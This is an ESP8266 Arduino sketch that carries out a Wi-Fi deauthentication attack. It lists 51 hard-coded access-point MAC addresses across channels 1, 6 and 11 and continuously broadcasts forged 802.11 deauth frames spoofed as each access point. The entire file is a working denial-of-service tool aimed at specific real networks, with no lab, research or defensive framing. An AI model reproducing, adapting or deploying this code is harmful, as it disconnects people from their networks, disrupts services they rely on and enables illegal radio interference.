#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

uint8_t ap1 [18][6] = {
                          { 0xDE, 0x9F, 0xDB, 0x73, 0x7C, 0x9E},
                          { 0xEE, 0x9F, 0xDB, 0x73, 0x7C, 0x9E},
                          { 0xDC, 0x9F, 0xDB, 0x73, 0x7C, 0x9E},
                          { 0x00, 0x27, 0x22, 0x57, 0x39, 0x6A},
                          { 0x12, 0x27, 0x22, 0x57, 0x39, 0x6A},
                          { 0x02, 0x27, 0x22, 0x57, 0x39, 0x6A},
                          { 0xEE, 0x9F, 0xDB, 0x9B, 0x6E, 0x58},
                          { 0xDC, 0x9F, 0xDB, 0x9B, 0x6E, 0x58},
                          { 0xDE, 0x9F, 0xDB, 0x9B, 0x6E, 0x58},
                          { 0xDC, 0x9F, 0xDB, 0x9B, 0x6D, 0xE6},
                          { 0xDE, 0x9F, 0xDB, 0x9B, 0x6D, 0xE6},
                          { 0xEE, 0x9F, 0xDB, 0x9B, 0x6D, 0xE6},
                          { 0xEE, 0x9F, 0xDB, 0x73, 0x7C, 0xEC},
                          { 0xDE, 0x9F, 0xDB, 0x73, 0x7C, 0xEC},
                          { 0xDC, 0x9F, 0xDB, 0x73, 0x7C, 0xEC},
                          { 0x12, 0x27, 0x22, 0xB5, 0x54, 0x39},
                          { 0x02, 0x27, 0x22, 0xB5, 0x54, 0x39},
                          { 0x00, 0x27, 0x22, 0xB5, 0x54, 0x39}
                       };
uint8_t ap6 [15][6] = {
                      {0xDE, 0x9F, 0xDB, 0x73, 0x7C, 0x4C},
                      {0xDC, 0x9F, 0xDB, 0x73, 0x7C, 0x4C},
                      {0xEE, 0x9F, 0xDB, 0x73, 0x7C, 0x4C},
                      {0xDC, 0x9F, 0xDB, 0x73, 0x7C, 0xB8},
                      {0xDE, 0x9F, 0xDB, 0x73, 0x7C, 0xB8},
                      {0xEE, 0x9F, 0xDB, 0x73, 0x7C, 0xB8},
                      {0xDC, 0x9F, 0xDB, 0x73, 0x61, 0x98},
                      {0xDE, 0x9F, 0xDB, 0x73, 0x61, 0x98},
                      {0xEE, 0x9F, 0xDB, 0x73, 0x61, 0x98},
                      {0x00, 0x27, 0x22, 0xF3, 0x5A, 0x75},
                      {0x02, 0x27, 0x22, 0xF3, 0x5A, 0x75},
                      {0x12, 0x27, 0x22, 0xF3, 0x5A, 0x75},
                      {0xEE, 0x9F, 0xDB, 0x73, 0x7C, 0xEB},
                      {0xDC, 0x9F, 0xDB, 0x73, 0x7C, 0xEB},
                      {0xDE, 0x9F, 0xDB, 0x73, 0x7C, 0xEB}
                       };
uint8_t ap11 [18][6] = {
                      {0xDE, 0x9F, 0xDB, 0x73, 0x7C, 0x4E},
                      {0xEE, 0x9F, 0xDB, 0x73, 0x7C, 0x4E},
                      {0xDC, 0x9F, 0xDB, 0x73, 0x7C, 0x4E},
                      {0xDE, 0x9F, 0xDB, 0x9B, 0x6D, 0x58},
                      {0xDC, 0x9F, 0xDB, 0x9B, 0x6D, 0x58},
                      {0xEE, 0x9F, 0xDB, 0x9B, 0x6D, 0x58},
                      {0xEE, 0x9F, 0xDB, 0x9B, 0x6E, 0x9A},
                      {0xDE, 0x9F, 0xDB, 0x9B, 0x6E, 0x9A},
                      {0xDC, 0x9F, 0xDB, 0x9B, 0x6E, 0x9A},
                      {0xDE, 0x9F, 0xDB, 0x9B, 0x6E, 0x24},
                      {0xEE, 0x9F, 0xDB, 0x9B, 0x6E, 0x24},
                      {0xDC, 0x9F, 0xDB, 0x9B, 0x6E, 0x24},
                      {0xDE, 0x9F, 0xDB, 0x9B, 0x6E, 0xBC},
                      {0xEE, 0x9F, 0xDB, 0x9B, 0x6E, 0xBC},
                      {0xDC, 0x9F, 0xDB, 0x9B, 0x6E, 0xBC},
                      {0x00, 0x27, 0x22, 0xB5, 0x52, 0x98},
                      {0x12, 0x27, 0x22, 0xB5, 0x52, 0x98},
                      {0x02, 0x27, 0x22, 0xB5, 0x52, 0x98}
                       };
uint8_t packet[26] = {
  /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
  /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,//reciever (target)
  /* 10 - 15 */ 0xDE, 0x9F, 0xDB, 0x73, 0x7C, 0x4C, //source (ap)
  /* 16 - 21 */ 0xDE, 0x9F, 0xDB, 0x73, 0x7C, 0x4C, //BSSID (ap)
  /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
  /* 24 - 25 */ 0x07, 0x00, //reason code (1 = unspecified reason)
};

uint16_t deauth(uint8_t *aps)
{
    int i=0;
    for (i=0; i<6; i++) {
      packet[i+10] = aps[i];
      packet[i+16] = aps[i];
    }
    wifi_send_pkt_freedom(packet, 26, 0);
}

void setup() {
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(1);
}

void loop() {
  wifi_set_channel(1);
  for (int i=0;i<18;i++) {
    deauth(ap1[i]);
    delay(1);
  }
  wifi_set_channel(6);
  for (int i=0;i<15;i++) {
    deauth(ap6[i]);
    delay(1);
  }
  wifi_set_channel(11);
  for (int i=0;i<18;i++) {
    deauth(ap11[i]);
    delay(1);
  }
}
